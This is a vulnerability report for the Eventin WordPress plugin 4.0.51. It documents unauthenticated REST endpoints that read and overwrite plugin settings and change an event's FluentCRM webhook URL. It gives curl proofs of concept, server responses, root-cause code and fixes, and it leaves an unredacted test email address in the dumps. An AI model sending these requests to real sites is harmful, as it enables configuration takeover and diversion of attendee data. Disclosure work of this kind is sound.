## Vulnerability Report — Eventin (wp-event-solution)

### Report metadata
- **Title**: Unauthenticated Settings Disclosure + Settings Tampering (REST), and Unauthenticated Webhook Configuration Modification (REST)
- **Product**: Eventin – Event Manager, Event Booking, Calendar, Tickets and Registration Plugin (AI Powered)
- **WordPress.org URL**: https://wordpress.org/plugins/wp-event-solution/
- **Plugin slug**: `wp-event-solution`
- **Tested version**: `4.0.51`
- **Test environment**: Local WordPress (Docker), Apache/2.4.65 (Debian), PHP 8.3.29
- **Reported by**: <YOUR NAME / HANDLE>
- **Date**: 2025-12-30
- **Severity**:
  - **Issue 1 (settings read/write)**: High
  - **Issue 2 (webhook modification)**: Critical (data exfiltration potential)
- **Category**: Broken Access Control / Unauthenticated Configuration Read & Write

> **Ethics / scope note:** All testing described below was performed against a local, authorized test environment.

---

### Executive summary
Two REST API endpoints exposed by Eventin allow unauthenticated users to:
1) **Read and modify plugin settings** stored in the WordPress option `etn_event_options` (Issue 1).
2) **Modify an event’s FluentCRM webhook URL** stored in post meta `fluent_crm_webhook` (Issue 2).

The combination enables **configuration takeover** (integrity impact) and **potential sensitive-data exfiltration**: if FluentCRM webhooks are enabled, attacker-controlled webhooks could receive purchaser/attendee data when orders are created.

---

## Issue 1: Unauthenticated Settings Disclosure + Settings Tampering (REST)

### Summary
An unauthenticated user can read and modify Eventin settings stored in the WordPress option **`etn_event_options`** by calling the REST endpoint:

- `GET  /index.php?rest_route=/eventin/v1/event/settings`
- `POST /index.php?rest_route=/eventin/v1/event/settings`

This allows anonymous changes to plugin configuration (e.g., UI colors, pagination) and leaks configuration values (including email templates and configured email addresses).

### Impact
- **Confidentiality**: settings response includes sensitive configuration and template contents (e.g., email templates and sender addresses).
- **Integrity**: attacker can change settings (confirmed by subsequent GET and DB changes).
- **Availability / UX**: attacker can degrade site behavior (pagination, formatting) or misconfigure integrations.

### Proof of Concept (evidence from local lab)

#### A) Database evidence (before)
Query:
```sql
SELECT option_value
FROM wp_options
WHERE option_name = 'etn_event_options';
```

Result (before — as observed in the lab DB):
```text
a:34:{s:24:"etn_does_demo_data_exits";b:1;s:7:"_locale";s:4:"user";s:10:"wc_enabled";b:0;s:14:"payment_method";s:0:"";s:14:"plugin_version";s:6:"4.0.51";s:7:"modules";b:0;s:18:"zoom_authorize_url";s:125:"https://zoom.us/oauth/authorize?response_type=code&redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&client_id";s:18:"event_url_editable";b:0;s:5:"email";a:5:{i:0;b:0;s:14:"purchase_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:12:"Event Ticket";s:4:"body";s:69:"You have purchased ticket(s). Attendee ticket details are as follows.";s:13:"send_to_admin";b:1;s:23:"send_email_to_attendees";b:1;}s:17:"certificate_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:17:"Event Certificate";s:4:"body";s:191:"<p>Congratulations for successfully attending/completing the event '<span>{%event_title%}</span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. </p>";s:13:"send_to_admin";b:1;}s:9:"rsv_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:13:"response_type";s:5:"going";s:7:"subject";s:12:"RSVP request";s:4:"body";s:29:"We received your RSVP request";s:13:"send_to_admin";b:1;}s:14:"reminder_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:14:"Reminder email";s:4:"body";s:219:"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.";s:13:"send_to_admin";b:1;}}s:29:"etn_settings_country_currency";s:3:"USD";s:17:"decimal_separator";s:9:"comma_dot";s:18:"thousand_separator";s:1:",";s:8:"decimals";i:0;s:12:"price_format";s:8:"%1$s%2$s";s:17:"currency_position";s:4:"left";s:20:"wc_order_status_list";a:0:{}s:17:"wc_order_statuses";a:2:{i:0;s:9:"completed";i:1;s:10:"processing";}s:23:"show_ticket_expiry_date";b:0;s:20:"add_to_cart_redirect";s:8:"checkout";s:24:"order_thank_you_redirect";s:12:"woo_thankyou";s:21:"enable_purchase_email";s:2:"on";s:21:"ticket_purchase_timer";i:10;s:28:"ticket_purchase_timer_enable";s:3:"off";s:12:"extra_fields";a:0:{}s:14:"zoom_connected";b:0;s:23:"etn_include_from_search";s:2:"on";s:27:"archive_event_sorting_order";s:3:"ASC";s:17:"etn_primary_color";s:7:"#bf0000";s:21:"attendee_registration";N;s:12:"etn_zoom_api";N;s:18:"etn_groundhogg_api";N;s:17:"etn_googlemap_api";N;s:10:"etn_ai_api";N;s:14:"currencySymbol";s:1:"$";}
```

> **Redaction note**: The above includes real email addresses from the test instance and should be redacted before any public disclosure.

#### B) Unauthenticated READ (GET)
Observed request/response (curl):
```text
curl -i "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings"
HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 22:13:11 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Vary: Origin
Content-Length: 2287
Content-Type: application/json; charset=UTF-8

{"status_code":0,"messages":[],"date_format_list":["2025-12-30","12\/30\/2025","30\/12\/2025","12-30-2025","30-12-2025","2025.12.30","12.30.2025","30.12.2025","30 Dec 2025","30 December 2025"],"content":{"settings":{"etn_does_demo_data_exits":true,"_locale":"user","wc_enabled":false,"payment_method":"","plugin_version":"4.0.51","modules":false,"zoom_authorize_url":"https:\/\/zoom.us\/oauth\/authorize?response_type=code&redirect_uri=http:\/\/localhost:8080\/eventin-integration\/zoom-auth&client_id","event_url_editable":false,"email":{"0":false,"purchase_email":{"from":"marouanefreelance1@gmail.com","subject":"Event Ticket","body":"You have purchased ticket(s). Attendee ticket details are as follows.","send_to_admin":true,"send_email_to_attendees":true},"certificate_email":{"from":"marouanefreelance1@gmail.com","subject":"Event Certificate","body":"<p>Congratulations for successfully attending\/completing the event '<span>{%event_title%}<\/span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. <\/p>","send_to_admin":true},"rsv_email":{"from":"marouanefreelance1@gmail.com","response_type":"going","subject":"RSVP request","body":"We received your RSVP request","send_to_admin":true},"reminder_email":{"from":"marouanefreelance1@gmail.com","subject":"Reminder email","body":"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.","send_to_admin":true}},"etn_settings_country_currency":"USD","decimal_separator":"comma_dot","thousand_separator":",","decimals":0,"price_format":"%1$s%2$s","currency_position":"left","wc_order_status_list":[],"wc_order_statuses":["completed","processing"],"show_ticket_expiry_date":false,"add_to_cart_redirect":"checkout","order_thank_you_redirect":"woo_thankyou","enable_purchase_email":"on","ticket_purchase_timer":10,"ticket_purchase_timer_enable":"off","extra_fields":[],"zoom_connected":false,"etn_include_from_search":"on","archive_event_sorting_order":"ASC","etn_primary_color":"#bf0000","attendee_registration":null,"etn_zoom_api":null,"etn_groundhogg_api":null,"etn_googlemap_api":null,"etn_ai_api":null,"currencySymbol":"$"}}}
```

#### C) Unauthenticated WRITE (POST) — change `etn_primary_color`
Observed request/response (curl):
```text
curl -i -X POST   "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings"   -H "Content-Type: application/json"   -d '{
    "etn_primary_color": "#00ff00"
  }'

HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 22:25:22 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 44
Content-Type: application/json; charset=UTF-8

{"status_code":1,"messages":[],"content":[]}
```

Verification:
```text
GET /index.php?rest_route=/eventin/v1/event/settings
... response contains: "etn_primary_color":"#00ff00"
```

#### D) Unauthenticated WRITE (POST) — change `events_per_page`
Observed request/response (curl):
```text
curl -i -X POST   "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings"   -H "Content-Type: application/json"   -d '{
    "events_per_page": 1
  }'

HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 22:29:35 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 44
Content-Type: application/json; charset=UTF-8

{"status_code":1,"messages":[],"content":[]}
```

Verification:
```text
GET /index.php?rest_route=/eventin/v1/event/settings
... response contains: "events_per_page":1
```

#### E) Database evidence (after)
Query:
```sql
SELECT option_value
FROM wp_options
WHERE option_name = 'etn_event_options';
```

Result (after — as observed in the lab DB):
```text
a:39:{s:24:"etn_does_demo_data_exits";b:1;s:7:"_locale";s:4:"user";s:10:"wc_enabled";b:0;s:14:"payment_method";s:0:"";s:14:"plugin_version";s:6:"4.0.51";s:7:"modules";b:0;s:18:"zoom_authorize_url";s:125:"https://zoom.us/oauth/authorize?response_type=code&redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&client_id";s:18:"event_url_editable";b:0;s:5:"email";a:5:{i:0;b:0;s:14:"purchase_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:12:"Event Ticket";s:4:"body";s:69:"You have purchased ticket(s). Attendee ticket details are as follows.";s:13:"send_to_admin";b:1;s:23:"send_email_to_attendees";b:1;}s:17:"certificate_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:17:"Event Certificate";s:4:"body";s:191:"<p>Congratulations for successfully attending/completing the event '<span>{%event_title%}</span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. </p>";s:13:"send_to_admin";b:1;}s:9:"rsv_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:13:"response_type";s:5:"going";s:7:"subject";s:12:"RSVP request";s:4:"body";s:29:"We received your RSVP request";s:13:"send_to_admin";b:1;}s:14:"reminder_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:14:"Reminder email";s:4:"body";s:219:"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.";s:13:"send_to_admin";b:1;}}s:29:"etn_settings_country_currency";s:3:"USD";s:17:"decimal_separator";s:9:"comma_dot";s:18:"thousand_separator";s:1:",";s:8:"decimals";i:0;s:12:"price_format";s:8:"%1$s%2$s";s:17:"currency_position";s:4:"left";s:20:"wc_order_status_list";a:0:{}s:17:"wc_order_statuses";a:2:{i:0;s:9:"completed";i:1;s:10:"processing";}s:23:"show_ticket_expiry_date";b:0;s:20:"add_to_cart_redirect";s:8:"checkout";s:24:"order_thank_you_redirect";s:12:"woo_thankyou";s:21:"enable_purchase_email";s:2:"on";s:21:"ticket_purchase_timer";i:10;s:28:"ticket_purchase_timer_enable";s:3:"off";s:12:"extra_fields";a:0:{}s:14:"zoom_connected";b:0;s:23:"etn_include_from_search";s:2:"on";s:27:"archive_event_sorting_order";s:3:"ASC";s:17:"etn_primary_color";s:0:"";s:21:"attendee_registration";s:0:"";s:12:"etn_zoom_api";N;s:18:"etn_groundhogg_api";N;s:17:"etn_googlemap_api";N;s:10:"etn_ai_api";N;s:14:"currencySymbol";s:1:"$";s:15:"events_per_page";i:1;s:11:"date_format";s:0:"";s:11:"time_format";s:0:"";s:19:"etn_secondary_color";s:0:"";s:12:"sell_tickets";s:0:"";}
```

### Root cause (source code)

#### 1) REST permission callback always returns `true`
File: `base/api-handler.php`
Behavior: all routes registered via this handler are publicly accessible at the REST router level.

#### 2) Server-side nonce injection for `settings`
File: `base/api-handler.php`
Behavior: when `action == settings`, the code sets `X-WP-Nonce` to a freshly generated nonce (`wp_create_nonce('wp_rest')`) for the current request, defeating client-provided nonce validation.

#### 3) Inverted authorization logic in settings handlers
File: `core/event/api.php`
Functions:
- `get_settings()`
- `post_settings()`

Logic:
```php
if ( ! is_admin() && ! current_user_can( 'manage_options' ) ) {
   // ... allows access ...
} else {
   // ... denies ...
}
```

This authorizes anonymous/non-admin users and can deny actual administrators.

### Source code references (tested plugin source snapshot)
- `base/api-handler.php`:
  - nonce injection for `settings`: lines 51–55
  - router-level permission bypass: lines 70–72
- `core/event/api.php`:
  - `get_settings()`: lines 192–226
  - `post_settings()`: lines 233–266

### Recommended fix
- **Do not** generate or inject REST nonces server-side for unauthenticated requests.
- Ensure the REST route uses a strict `permission_callback` (e.g., `current_user_can('manage_options')` or a dedicated capability).
- Fix the logic in `get_settings()` and `post_settings()` so only authorized users can read/write settings.
- Return `WP_Error` with status `401/403` for unauthorized requests.
- Consider validating and sanitizing all settings keys/values, and restricting which settings are writable via API.

---

## Issue 2: Unauthenticated Webhook Configuration Modification (REST) — Critical

### Summary
The endpoint:
- `POST /index.php?rest_route=/eventin/v1/event/webhook`

allowed unauthenticated modification of event-level webhook configuration in the test environment.

**Webhook storage**: post meta
- `meta_key = fluent_crm_webhook`
- `post_id = <event_id>`

### Why this is critical
Eventin includes FluentCRM webhook integration that sends purchaser/attendee data to the URL stored in `fluent_crm_webhook`.
If an attacker can set this value, they can redirect webhook traffic (purchaser/attendee details) to attacker-controlled infrastructure.

Relevant integration code (data egress path):
- `core/Integrations/Webhook/FluentCRM.php`
  - reads `fluent_crm_webhook` from post meta
  - calls `wp_remote_post($fluentcrm_webhook, ['body' => $body])` when enabled

### Proof of Concept (evidence from local lab)

#### A) Endpoint discovery (OPTIONS)
```text
curl -i -X OPTIONS   "http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook"
  
HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 23:14:19 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 156
Content-Type: application/json; charset=UTF-8

{"namespace":"eventin\/v1\/event","methods":["GET","POST","PUT","PATCH","DELETE"],"endpoints":[{"methods":["GET","POST","PUT","PATCH","DELETE"],"args":[]}]}
```

#### B) Unauthenticated webhook update attempt (POST)
```text
curl -i -X POST   "http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook"   -H "Content-Type: application/json"   -d '{
    "event_id": 8,  
    "fluent_crm_webhook": "https://example.test/webhook"
  }'

HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 23:19:15 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 0
Content-Type: application/json; charset=UTF-8
```

#### C) Database confirmation (post meta created/modified)
Query:
```sql
SELECT COUNT(*)
FROM wp_postmeta
WHERE post_id = 8
  AND meta_key = 'fluent_crm_webhook';
```
Observed:
```text
COUNT = 1
```

Even if the stored value is normalized (e.g., empty string), the persistent state was modified, confirming broken access control in the tested environment.

### Root cause (likely)
Eventin’s v1 REST routing uses `base/api-handler.php` with a `permission_callback` that returns `true` for all actions. Any webhook handler implemented under the same v1 mechanism must enforce capability and nonce checks itself; otherwise it will be exposed to unauthenticated users.

### Recommended fix
- Ensure any webhook read/write endpoint requires:
  - a capability check (e.g., `current_user_can('manage_options')` or `current_user_can('etn_manage_event')`)
  - a valid REST nonce (provided by authenticated clients only)
- If webhook endpoints are not intended to be public, return `403` to unauthenticated callers.
- Consider restricting allowed webhook domains or using signed callbacks if inbound/outbound webhook configuration is supported.

---

## Suggested CVSS v3.1 (indicative)
- **Issue 1 (settings read/write)**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`
- **Issue 2 (webhook modification)**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (depends on whether webhook can exfiltrate sensitive buyer/attendee data in the site’s configuration)

---

## Timeline (template)
- 2025-12-30: Issue discovered and validated in local environment.
- YYYY-MM-DD: Report submitted to vendor.
- YYYY-MM-DD: Vendor acknowledgment.
- YYYY-MM-DD: Patch released.
- YYYY-MM-DD: Public disclosure / CVE request (if applicable).
